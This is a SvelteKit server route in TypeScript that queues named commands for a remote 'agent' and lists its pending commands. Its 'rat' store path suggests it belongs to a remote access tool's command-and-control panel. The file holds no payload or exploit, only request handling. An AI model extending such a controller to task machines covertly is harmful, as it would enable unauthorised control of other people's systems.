import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import type {
        CommandInput,
        CommandQueueSnapshot
} from '../../../../../../../shared/types/messages';

export const POST: RequestHandler = async ({ params, request }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        let payload: CommandInput;
        try {
                payload = (await request.json()) as CommandInput;
        } catch (err) {
                throw error(400, 'Invalid command payload');
        }

        if (!payload?.name) {
                throw error(400, 'Command name is required');
        }

        try {
                const response = registry.queueCommand(id, payload);
                return json(response);
        } catch (err) {
                if (err instanceof RegistryError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to queue command');
        }
};

export const GET: RequestHandler = ({ params }) => {
        const id = params.id;
        if (!id) {
                throw error(400, 'Missing agent identifier');
        }

        try {
                const commands = registry.peekCommands(id);
                return json({ commands } satisfies CommandQueueSnapshot);
        } catch (err) {
                if (err instanceof RegistryError) {
                        throw error(err.status, err.message);
                }
                throw error(500, 'Failed to fetch queued commands');
        }
};
